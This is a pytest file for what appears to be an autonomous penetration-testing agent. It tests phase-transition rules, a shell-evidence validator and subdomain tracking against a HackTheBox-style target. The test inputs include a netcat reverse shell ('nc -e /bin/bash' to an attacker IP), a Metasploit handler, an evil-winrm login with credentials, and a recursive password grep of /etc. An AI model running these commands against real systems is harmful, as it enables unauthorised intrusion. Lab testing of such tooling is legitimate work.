"""
tests/test_ops_phase_hardening.py — Phase C: Phase Hardening Tests

Covers:
  - PhaseInvariantChecker: transitions, preconditions, strict mode
  - ShellValidator: evidence detection, local rejection, root detection
  - DomainManager: primary domain, subdomain tracking, extraction
"""

import os
import pytest

os.environ.setdefault("ARIASKA_DRY_RUN", "1")


# ─────────────────────────────────────────────────────────────────────────────
# Phase Invariant Checker Tests
# ─────────────────────────────────────────────────────────────────────────────

class TestPhaseInvariantChecker:
    """Tests for PhaseInvariantChecker."""

    @pytest.fixture(autouse=True)
    def setup(self):
        from core.ops.phase_invariants import PhaseInvariantChecker
        self.checker = PhaseInvariantChecker(strict=True)
        self.lenient = PhaseInvariantChecker(strict=False)

    def test_valid_forward_transition(self):
        """RECON -> ENUMERATION is valid with port discovered."""
        result = self.checker.validate_transition(
            current_phase="RECON",
            requested_phase="ENUMERATION",
            state_flags={"ports_discovered": True},
            discovery_board={"ports": {"80"}},
        )
        assert result.valid

    def test_backward_transition_rejected(self):
        """ENUMERATION -> RECON is rejected."""
        result = self.checker.validate_transition(
            current_phase="ENUMERATION",
            requested_phase="RECON",
            state_flags={},
            discovery_board={},
        )
        assert not result.valid
        assert "backward" in result.details.lower() or "Backward" in result.details

    def test_same_phase_valid(self):
        """Staying in same phase is valid."""
        result = self.checker.validate_transition(
            current_phase="RECON",
            requested_phase="RECON",
            state_flags={},
            discovery_board={},
        )
        assert result.valid

    def test_skip_phase_strict_rejected(self):
        """Skipping >1 phase in strict mode is rejected."""
        result = self.checker.validate_transition(
            current_phase="RECON",
            requested_phase="EXPLOITATION",
            state_flags={"ports_discovered": True, "services_enumerated": True},
            discovery_board={"ports": {"80"}, "services": {"http"}},
        )
        assert not result.valid
        assert "skip" in result.details.lower()

    def test_skip_phase_lenient_allowed(self):
        """Skipping >1 phase in lenient mode with preconditions met."""
        result = self.lenient.validate_transition(
            current_phase="RECON",
            requested_phase="EXPLOITATION",
            state_flags={"ports_discovered": True, "services_enumerated": True},
            discovery_board={"ports": {"80"}, "services": {"http"}},
        )
        assert result.valid

    def test_exploitation_requires_services(self):
        """EXPLOITATION needs services_enumerated flag."""
        result = self.lenient.validate_transition(
            current_phase="ENUMERATION",
            requested_phase="EXPLOITATION",
            state_flags={"ports_discovered": True},
            discovery_board={"ports": {"80"}},
        )
        assert not result.valid
        assert "services_enumerated" in result.details

    def test_exploitation_satisfied(self):
        """EXPLOITATION passes with proper preconditions."""
        result = self.checker.validate_transition(
            current_phase="ENUMERATION",
            requested_phase="EXPLOITATION",
            state_flags={"ports_discovered": True, "services_enumerated": True},
            discovery_board={"ports": {"80"}, "services": {"http"}},
        )
        assert result.valid

    def test_privesc_requires_shell(self):
        """PRIVILEGE_ESCALATION needs shell_obtained."""
        result = self.checker.validate_transition(
            current_phase="EXPLOITATION",
            requested_phase="PRIVILEGE_ESCALATION",
            state_flags={"ports_discovered": True, "services_enumerated": True},
            discovery_board={"ports": {"80"}, "services": {"http"},
                             "shells": set()},
        )
        assert not result.valid

    def test_privesc_satisfied(self):
        """PRIVILEGE_ESCALATION passes with shell."""
        result = self.checker.validate_transition(
            current_phase="EXPLOITATION",
            requested_phase="PRIVILEGE_ESCALATION",
            state_flags={"ports_discovered": True, "services_enumerated": True,
                         "shell_obtained": True},
            discovery_board={"ports": {"80"}, "services": {"http"},
                             "shells": {"RedAgent"}},
        )
        assert result.valid

    def test_invalid_phase_name(self):
        """Unknown phase name is rejected."""
        result = self.checker.validate_transition(
            current_phase="RECON",
            requested_phase="UNKNOWN_PHASE",
            state_flags={},
            discovery_board={},
        )
        assert not result.valid
        assert "Unknown" in result.details

    def test_validate_state_consistency(self):
        """State consistency check flags missing shell for privesc."""
        issues = self.checker.validate_state_consistency(
            current_phase="PRIVILEGE_ESCALATION",
            state_flags={"shell_obtained": False},
            discovery_board={"shells": set()},
        )
        assert len(issues) > 0

    def test_validate_state_consistency_clean(self):
        """State consistency passes for well-formed RECON."""
        issues = self.checker.validate_state_consistency(
            current_phase="RECON",
            state_flags={},
            discovery_board={"ports": set()},
        )
        assert len(issues) == 0

    def test_transition_log(self):
        """Transition log records valid transitions."""
        self.checker.validate_transition(
            current_phase="RECON",
            requested_phase="ENUMERATION",
            state_flags={"ports_discovered": True},
            discovery_board={"ports": {"80"}},
        )
        log = self.checker.get_transition_log()
        assert len(log) == 1
        assert log[0]["from"] == "RECON"
        assert log[0]["to"] == "ENUMERATION"

    def test_reset(self):
        """Reset clears transition log."""
        self.checker.validate_transition(
            current_phase="RECON",
            requested_phase="ENUMERATION",
            state_flags={"ports_discovered": True},
            discovery_board={"ports": {"80"}},
        )
        self.checker.reset()
        assert len(self.checker.get_transition_log()) == 0

    def test_find_highest_valid_phase(self):
        """Highest valid phase with no flags is RECON."""
        phase = self.checker._find_highest_valid_phase(
            state_flags={},
            discovery_board={},
        )
        assert phase == "RECON"

    def test_find_highest_valid_phase_with_shell(self):
        """With shell + services, reaches at least PRIVILEGE_ESCALATION."""
        phase = self.checker._find_highest_valid_phase(
            state_flags={"ports_discovered": True, "services_enumerated": True,
                         "shell_obtained": True},
            discovery_board={"ports": {"80"}, "services": {"http"},
                             "shells": {"RedAgent"}},
        )
        from core.ops.phase_invariants import _PHASE_INDEX
        assert _PHASE_INDEX[phase] >= _PHASE_INDEX["PRIVILEGE_ESCALATION"]

    def test_enumeration_requires_ports(self):
        """ENUMERATION needs ports_discovered flag and ports in board."""
        result = self.checker.validate_transition(
            current_phase="RECON",
            requested_phase="ENUMERATION",
            state_flags={},
            discovery_board={"ports": set()},
        )
        assert not result.valid

    def test_result_has_recommended_phase(self):
        """Result always has a recommended_phase."""
        result = self.checker.validate_transition(
            current_phase="RECON",
            requested_phase="EXPLOITATION",
            state_flags={},
            discovery_board={},
        )
        assert result.recommended_phase  # Non-empty string


# ─────────────────────────────────────────────────────────────────────────────
# Shell Validator Tests
# ─────────────────────────────────────────────────────────────────────────────

class TestShellValidator:
    """Tests for ShellValidator."""

    @pytest.fixture(autouse=True)
    def setup(self):
        from core.ops.shell_validator import ShellValidator
        self.validator = ShellValidator()

    def test_empty_input_rejected(self):
        """Empty command/output returns invalid."""
        result = self.validator.validate(command="", output="")
        assert not result.is_valid_shell

    def test_local_command_rejected(self):
        """searchsploit (local-only) cannot produce shells."""
        result = self.validator.validate(
            command="searchsploit apache 2.4",
            output="shell session 1 opened",
        )
        assert not result.is_valid_shell
        assert "local-only" in result.rejection_reason

    def test_ssh_shell_detected(self):
        """SSH command with shell evidence is valid."""
        result = self.validator.validate(
            command="ssh admin@10.10.10.50",
            output="admin@target:~$ uid=1000(admin) gid=1000(admin)",
            target_ip="10.10.10.50",
        )
        assert result.is_valid_shell
        assert result.confidence >= 0.6

    def test_meterpreter_shell_detected(self):
        """Metasploit meterpreter shell is valid."""
        result = self.validator.validate(
            command="msfconsole -x 'use exploit/multi/handler'",
            output="Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.50:54321)",
        )
        assert result.is_valid_shell

    def test_root_shell_detected(self):
        """Root shell evidence triggers is_root_shell."""
        result = self.validator.validate(
            command="ssh root@10.10.10.50",
            output="root@target:~# uid=0(root) gid=0(root)",
            target_ip="10.10.10.50",
        )
        assert result.is_valid_shell
        assert result.is_root_shell

    def test_windows_system_shell(self):
        """NT AUTHORITY\\SYSTEM triggers root shell."""
        result = self.validator.validate(
            command="evil-winrm -i 10.10.10.50 -u admin -p pass",
            output="Shell session 1 opened\nnt authority\\system",
            target_ip="10.10.10.50",
        )
        assert result.is_valid_shell
        assert result.is_root_shell

    def test_no_evidence_rejected(self):
        """Command output without shell patterns is rejected."""
        result = self.validator.validate(
            command="ssh admin@10.10.10.50",
            output="Connection refused",
            target_ip="10.10.10.50",
        )
        assert not result.is_valid_shell
        assert "no shell evidence" in result.rejection_reason

    def test_target_mismatch_rejected(self):
        """Command not referencing target IP is rejected."""
        result = self.validator.validate(
            command="ssh admin@192.168.1.1",
            output="uid=1000(admin) gid=1000(admin)",
            target_ip="10.10.10.50",
        )
        assert not result.is_valid_shell
        assert "target" in result.rejection_reason

    def test_domain_reference_accepted(self):
        """Command referencing domain (not IP) is accepted."""
        result = self.validator.validate(
            command="ssh admin@permx.htb",
            output="uid=1000(admin) gid=1000(admin)",
            target_ip="10.10.10.50",
            domain="permx.htb",
        )
        assert result.is_valid_shell

    def test_validated_shells_tracked(self):
        """Validated shells are tracked in history."""
        self.validator.validate(
            command="ssh admin@10.10.10.50",
            output="uid=1000(admin) gid=1000(admin)",
            target_ip="10.10.10.50",
        )
        shells = self.validator.get_validated_shells()
        assert len(shells) == 1
        assert "admin" in shells[0]["command"]

    def test_reset_clears_history(self):
        """Reset clears validated shells."""
        self.validator.validate(
            command="ssh admin@10.10.10.50",
            output="uid=1000(admin) gid=1000(admin)",
            target_ip="10.10.10.50",
        )
        self.validator.reset()
        assert len(self.validator.get_validated_shells()) == 0

    def test_nc_shell_capable(self):
        """nc (netcat) is a shell-capable command."""
        result = self.validator.validate(
            command="nc -e /bin/bash 10.10.14.5 4444",
            output="Command shell session 1 opened",
        )
        assert result.is_valid_shell

    def test_cat_command_rejected(self):
        """cat is local-only, even with shell-like output."""
        result = self.validator.validate(
            command="cat /var/log/auth.log",
            output="shell session 1 opened",
        )
        assert not result.is_valid_shell

    def test_confidence_increases_with_evidence(self):
        """Multiple evidence patterns increase confidence."""
        result = self.validator.validate(
            command="ssh admin@10.10.10.50",
            output="uid=1000(admin) gid=1000(admin)\nshell session 1 opened",
            target_ip="10.10.10.50",
        )
        assert result.confidence >= 0.8

    def test_grep_command_rejected(self):
        """grep is local-only."""
        result = self.validator.validate(
            command="grep -r password /etc/",
            output="shell session 10 opened",
        )
        assert not result.is_valid_shell


# ─────────────────────────────────────────────────────────────────────────────
# Domain Manager Tests
# ─────────────────────────────────────────────────────────────────────────────

class TestDomainManager:
    """Tests for DomainManager."""

    @pytest.fixture(autouse=True)
    def setup(self):
        from core.ops.domain_manager import DomainManager
        self.dm = DomainManager()

    def test_set_primary_domain(self):
        """Setting primary domain succeeds."""
        assert self.dm.set_primary("permx.htb", ip="10.10.11.23")
        assert self.dm.get_primary_domain() == "permx.htb"
        assert self.dm.get_primary_ip() == "10.10.11.23"

    def test_primary_auto_expands_subdomains(self):
        """Primary domain auto-expands common subdomains."""
        self.dm.set_primary("permx.htb", ip="10.10.11.23")
        domains = self.dm.get_all_domains()
        assert "www.permx.htb" in domains
        assert "ftp.permx.htb" in domains
        assert "dev.permx.htb" in domains
        assert "api.permx.htb" in domains

    def test_add_domain(self):
        """Adding a new domain returns True."""
        self.dm.set_primary("permx.htb")
        assert self.dm.add_domain("lms.permx.htb", source="vhost_enum")
        assert self.dm.has_domain("lms.permx.htb")

    def test_add_duplicate_domain(self):
        """Adding duplicate returns False."""
        self.dm.set_primary("permx.htb")
        self.dm.add_domain("lms.permx.htb")
        assert not self.dm.add_domain("lms.permx.htb")

    def test_get_confirmed_domains(self):
        """Confirmed domains excludes auto-expanded."""
        self.dm.set_primary("permx.htb")
        self.dm.add_domain("lms.permx.htb", source="vhost_enum")
        confirmed = self.dm.get_confirmed_domains()
        assert "permx.htb" in confirmed
        assert "lms.permx.htb" in confirmed
        # auto-expanded should NOT be in confirmed
        assert "www.permx.htb" not in confirmed

    def test_extract_domains_from_output(self):
        """Extract subdomains from tool output."""
        self.dm.set_primary("permx.htb")
        output = "Found vhosts: lms.permx.htb, backup.permx.htb"
        new = self.dm.extract_domains_from_output(output)
        assert "lms.permx.htb" in new
        assert "backup.permx.htb" in new

    def test_extract_ignores_non_subdomains(self):
        """Extraction only finds subdomains of primary."""
        self.dm.set_primary("permx.htb")
        output = "Found: evil.attacker.com and lms.permx.htb"
        new = self.dm.extract_domains_from_output(output)
        assert "evil.attacker.com" not in new
        assert "lms.permx.htb" in new

    def test_get_hosts_entries(self):
        """Hosts entries have ip and hostname."""
        self.dm.set_primary("permx.htb", ip="10.10.11.23")
        self.dm.add_domain("lms.permx.htb")
        entries = self.dm.get_hosts_entries()
        assert len(entries) > 0
        hostnames = [e["hostname"] for e in entries]
        assert "permx.htb" in hostnames
        assert "lms.permx.htb" in hostnames
        for entry in entries:
            assert entry["ip"] == "10.10.11.23"

    def test_get_vhosts(self):
        """Virtual hosts are tracked separately."""
        self.dm.set_primary("permx.htb")
        self.dm.add_domain("lms.permx.htb", is_vhost=True)
        vhosts = self.dm.get_vhosts()
        assert "lms.permx.htb" in vhosts

    def test_domain_count(self):
        """Domain count includes primary + auto-expanded + manual."""
        self.dm.set_primary("permx.htb")
        self.dm.add_domain("lms.permx.htb")
        assert self.dm.domain_count() >= 12  # primary + 10 subdomains + lms

    def test_get_context(self):
        """Context dict has expected keys."""
        self.dm.set_primary("permx.htb", ip="10.10.11.23")
        ctx = self.dm.get_context()
        assert ctx["primary_domain"] == "permx.htb"
        assert ctx["primary_ip"] == "10.10.11.23"
        assert ctx["domain_count"] >= 11
        assert isinstance(ctx["all_domains"], list)

    def test_reset(self):
        """Reset clears all domain state."""
        self.dm.set_primary("permx.htb")
        self.dm.reset()
        assert self.dm.get_primary_domain() is None
        assert self.dm.domain_count() == 0

    def test_empty_domain_rejected(self):
        """Empty string domain is rejected."""
        assert not self.dm.set_primary("")
        assert not self.dm.add_domain("")

    def test_case_insensitive(self):
        """Domains are lowercased."""
        self.dm.set_primary("PermX.HTB")
        assert self.dm.has_domain("permx.htb")

    def test_ip_inheritance(self):
        """Added domains inherit primary IP."""
        self.dm.set_primary("permx.htb", ip="10.10.11.23")
        self.dm.add_domain("new.permx.htb")
        entries = self.dm.get_hosts_entries()
        new_entry = [e for e in entries if e["hostname"] == "new.permx.htb"]
        assert len(new_entry) == 1
        assert new_entry[0]["ip"] == "10.10.11.23"

    def test_extract_no_primary_returns_empty(self):
        """Extraction without primary domain returns empty."""
        result = self.dm.extract_domains_from_output("Found: test.example.com")
        assert result == []


# ─────────────────────────────────────────────────────────────────────────────
# Feature Flag Tests
# ─────────────────────────────────────────────────────────────────────────────

class TestPhaseHardeningFlags:
    """Phase 38.2 feature flags exist."""

    def test_phase_invariants_flag(self):
        from core.feature_flags import FeatureFlags
        ff = FeatureFlags()
        assert hasattr(ff, "phase_invariants")
        assert ff.phase_invariants is True

    def test_shell_validator_flag(self):
        from core.feature_flags import FeatureFlags
        ff = FeatureFlags()
        assert hasattr(ff, "shell_validator")
        assert ff.shell_validator is True

    def test_domain_manager_flag(self):
        from core.feature_flags import FeatureFlags
        ff = FeatureFlags()
        assert hasattr(ff, "domain_manager")
        assert ff.domain_manager is True


# ─────────────────────────────────────────────────────────────────────────────
# Integration Tests
# ─────────────────────────────────────────────────────────────────────────────

class TestPhaseHardeningIntegration:
    """Cross-module integration tests."""

    def test_shell_validator_gates_phase_transition(self):
        """Shell must be validated before PRIVILEGE_ESCALATION."""
        from core.ops.phase_invariants import PhaseInvariantChecker
        from core.ops.shell_validator import ShellValidator

        checker = PhaseInvariantChecker()
        validator = ShellValidator()

        # Validate a real shell
        shell_result = validator.validate(
            command="ssh admin@10.10.10.50",
            output="uid=1000(admin) gid=1000(admin)",
            target_ip="10.10.10.50",
        )
        assert shell_result.is_valid_shell

        # Now check phase transition WITH shell
        phase_result = checker.validate_transition(
            current_phase="EXPLOITATION",
            requested_phase="PRIVILEGE_ESCALATION",
            state_flags={
                "ports_discovered": True, "services_enumerated": True,
                "shell_obtained": True,
            },
            discovery_board={
                "ports": {"22"}, "services": {"ssh"},
                "shells": {"RedAgent"},
            },
        )
        assert phase_result.valid

    def test_shell_validator_blocks_without_evidence(self):
        """Without validated shell, PRIVESC is blocked."""
        from core.ops.phase_invariants import PhaseInvariantChecker

        checker = PhaseInvariantChecker()
        result = checker.validate_transition(
            current_phase="EXPLOITATION",
            requested_phase="PRIVILEGE_ESCALATION",
            state_flags={
                "ports_discovered": True, "services_enumerated": True,
                "shell_obtained": False,  # No shell!
            },
            discovery_board={
                "ports": {"22"}, "services": {"ssh"},
                "shells": set(),
            },
        )
        assert not result.valid

    def test_domain_manager_provides_hosts_context(self):
        """DomainManager context can feed HostsManager."""
        from core.ops.domain_manager import DomainManager

        dm = DomainManager()
        dm.set_primary("permx.htb", ip="10.10.11.23")
        dm.add_domain("lms.permx.htb", source="vhost_enum")

        entries = dm.get_hosts_entries()
        # All entries should be valid for /etc/hosts
        for entry in entries:
            assert entry["ip"]
            assert entry["hostname"]
            assert "." in entry["hostname"]

    def test_ops_package_exports(self):
        """All Phase C classes are importable from core.ops."""
        from core.ops import __all__
        assert "PhaseInvariantChecker" in __all__
        assert "ShellValidator" in __all__
        assert "DomainManager" in __all__
